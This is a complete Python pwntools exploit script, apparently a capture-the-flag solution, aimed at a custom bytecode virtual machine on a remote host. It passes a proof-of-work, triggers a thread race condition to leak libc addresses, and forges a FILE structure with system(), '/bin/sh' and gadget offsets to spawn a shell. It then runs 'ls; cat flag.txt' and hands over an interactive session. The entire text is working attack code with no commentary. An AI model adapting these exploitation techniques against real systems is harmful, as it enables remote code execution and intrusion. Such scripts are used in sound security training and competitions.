from pwn import *
from gmpy2 import *

f_print = 0
f_sleep = 1
f_copy_to_stack = 2
f_mov_to_stack2 = 3
f_pop_stack2 = 4
f_push_stack2 = 5
f_start_thread = 6
f_restart_at = 7

def pop_stack():
	return "\x00"
def push_stack(imm):
	return "\x01" + p64(imm)
def add():
	return "\x02"
def subtract():
	return "\x03"
def multiply():
	return "\x04"
def divide():
	return "\x05"
def lshift():
	return "\x06"
def rshift():
	return "\x07"
def bitwise_and():
	return "\x08"
def bitwise_or():
	return "\x09"
def dupe():
	return "\x0a"
def call_reserved_func(idx):
	return "\x0b" + p64(idx)
def compare():
	return "\x0c"
def branch_eq(target):
	return "\x0d" + p64(target)
def branch_neq(target):
	return "\x0e" + p64(target)
def quit():
	return "\x0f"
def call(const_off):
	return "\x10" + p64(const_off)
def ret():
	return "\x11"
def jump_imm(target):
	return "\x12" + p64(target)
def bitwise_xor():
	return "\x13"
def pop_all():
	return "\x14"

libc = ELF("./libc.so.6")
while True:
	for t in range(0x150000, 0x4000000, 0x10000):
		# r = process("./pwn")
		r = remote("43.154.211.24", 1337)

		a = r.recvline().strip().decode()
		exp = int(a.split()[1].split('^')[-1][:-1])
		mod = int(a.split()[3])
		print(exp, mod)

		ans = pow(mpz(2), pow(mpz(2), mpz(exp)), mpz(mod))
		r.sendline(str(ans))
		r.recvline()

		# gdb.attach(r, """
		# 	b _IO_flush_all_lockp

		# 	define hook-stop
		# 		quit
		# 	end
		# 	continue
		# """)
		# r = remote("43.154.211.24", 1337)

		code = ""
		func1 = len(code)
		N = 16
		code += push_stack(0x4141414141414141) + dupe()*(N-1)
		for i in range(N):
			code += call_reserved_func(f_push_stack2)
		code += call_reserved_func(f_pop_stack2)*(N)

		# Now we should have 1 element left. Start 2 threads to do the double pop race condition
		code += call_reserved_func(f_start_thread) + p64(2)
		code += call_reserved_func(f_start_thread) + p64(2)
		code += call_reserved_func(f_start_thread) + p64(2)
		code += call_reserved_func(f_start_thread) + p64(1)
		do_wait = len(code)
		code += push_stack(t+0xffffffff)
		code += call_reserved_func(f_sleep)
		code += call_reserved_func(f_copy_to_stack)
		code += push_stack(0x0) + compare()
		code += branch_eq(do_wait)

		code += push_stack(0x0)
		loop_start = len(code)
		code += call_reserved_func(f_pop_stack2)
		code += call_reserved_func(f_copy_to_stack)
		code += push_stack(0xfff) + bitwise_and()
		code += push_stack(0x640) + compare()
		code += branch_eq(len(code) + 10 + 2 + 9 + 9)
		code += push_stack(0x1) + add()
		code += dupe() + push_stack(30) + compare()
		code += branch_neq(loop_start)

		code += call_reserved_func(f_copy_to_stack) + dupe()
		code += call_reserved_func(f_print)

		# offset 0x49c0
		code += push_stack(0x0)
		loop_start = len(code)
		code += call_reserved_func(f_pop_stack2)
		code += push_stack(0x1) + add()
		code += dupe() + push_stack(9190 - 1 + 1 + 1 + 1)
		code += compare()
		code += branch_neq(loop_start)

		code += pop_stack()
		code += push_stack(0x0101000000000000)
		code += call_reserved_func(f_push_stack2)

		code += push_stack(0x0)
		loop_start = len(code)
		code += push_stack(0x0)
		code += call_reserved_func(f_push_stack2)
		code += push_stack(0x1) + add()
		code += dupe() + push_stack(28-1)
		code += compare()
		code += branch_neq(loop_start)

		code += pop_stack()
		code += push_stack(0x49c0) + add()
		# code += push_stack(0x49c0 + 0x801000) + add()
		code += dupe() + dupe()
		code += push_stack(0x21a780) # IO stdout
		code += add()
		code += call_reserved_func(f_push_stack2)

		# Walk back
		code += push_stack(0x0)
		loop_start = len(code)
		code += push_stack(0x0)
		code += call_reserved_func(f_push_stack2)
		code += push_stack(0x1) + add()
		code += dupe() + push_stack(9189-6-2)
		code += compare()
		code += branch_neq(loop_start)


		code += pop_stack()
		code += push_stack(0x91)
		code += call_reserved_func(f_push_stack2)

		code += push_stack(0x3b01010101010101)
		code += call_reserved_func(f_push_stack2)

		code += push_stack(0x0) # _IO_read_ptr
		code += call_reserved_func(f_push_stack2)

		code += dupe() + push_stack(libc.symbols['system']) + add()
		code += call_reserved_func(f_push_stack2)

		code += push_stack(0x0) + dupe()*1
		code += call_reserved_func(f_push_stack2)*2

		code += push_stack(0x1)
		code += call_reserved_func(f_push_stack2)

		code += push_stack(0x0) + dupe()*1
		code += call_reserved_func(f_push_stack2)*2

		code += push_stack(int("/bin/sh\x00"[::-1].encode("hex"), 16))
		code += call_reserved_func(f_push_stack2)

		code += push_stack(0x0) + dupe()*1
		code += call_reserved_func(f_push_stack2)*2

		code += dupe() + push_stack(0x0000000000163830) + add() # gadget
		code += call_reserved_func(f_push_stack2)

		code += push_stack(0x0) + dupe()*4
		code += call_reserved_func(f_push_stack2)*5

		code += dupe() + push_stack(0x7ffff7f91a70 - 0x7ffff7d76000) + add()# lock
		code += call_reserved_func(f_push_stack2)

		code += push_stack(0x0)
		code += call_reserved_func(f_push_stack2)

		code += dupe() + push_stack(libc.symbols['_IO_2_1_stdout_'] + 0xb8) + add()
		code += call_reserved_func(f_push_stack2)

		code += dupe() + push_stack(0x00000000021B6C0) + add()
		code += call_reserved_func(f_push_stack2)

		code += push_stack(0x0) + dupe()*1
		code += call_reserved_func(f_push_stack2)*2

		code += dupe() + push_stack(libc.symbols['_IO_2_1_stdout_'] + 0x30) + add()
		code += call_reserved_func(f_push_stack2)

		code += push_stack(0x0) + dupe()*2
		code += call_reserved_func(f_push_stack2)*3

		code += dupe() + push_stack(libc.sym['_IO_wfile_jumps']-0x18) + add()
		code += call_reserved_func(f_push_stack2)

		code += pop_all() + pop_stack()
		code += quit()


		func2 = len(code)
		code += push_stack(0x0)
		code += call_reserved_func(f_push_stack2)
		code += push_stack(0x10000)
		code += call_reserved_func(f_sleep)
		code += call_reserved_func(f_copy_to_stack)
		code += push_stack(0x0) + compare()
		code += branch_eq(func2)
		code += quit()

		func3 = len(code)
		code += call_reserved_func(f_pop_stack2)
		code += call_reserved_func(f_copy_to_stack)
		code += push_stack(0x0) + compare()
		code += branch_eq(func3)
		code += quit()

		r.send(p32(len(code)))
		r.send(code)

		r.send(p32(3))
		r.send(p32(func1))
		r.send(p32(func2))
		r.send(p32(func3))

		r.sendline("ls; cat flag.txt")

		d = r.recvline()
		print("D", d, hex(t))
		if "nil" not in d and "error" not in d:
			r.interactive()
			exit()
		r.close()
